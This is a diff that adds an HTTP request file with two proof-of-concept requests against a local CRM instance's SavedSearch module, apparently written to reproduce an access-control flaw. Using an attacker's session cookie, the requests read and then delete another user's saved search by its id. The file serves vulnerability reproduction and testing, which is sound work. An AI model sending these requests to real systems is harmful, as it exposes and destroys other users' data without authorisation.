@@ -1,0 +1,10 @@
+### 1) READ another user's saved search by id (attacker session)
+GET /index.php?module=SavedSearch&action=index&saved_search_select=63913f4e-640d-4227-b437-ad5529f9591a&search_module=Accounts HTTP/1.1
+Host: localhost:33116
+Cookie: PHPSESSID=<attacker-session>
+
+### 2) DELETE another user's saved search by id (attacker session)
+GET /index.php?module=SavedSearch&action=index&saved_search_action=delete&saved_search_select=63913f4e-640d-4227-b437-ad5529f9591a&search_module=Accounts HTTP/1.1
+Host: localhost:33116
+Cookie: PHPSESSID=<attacker-session>
+Referer: http://localhost:33116/index.php?module=Accounts&action=index
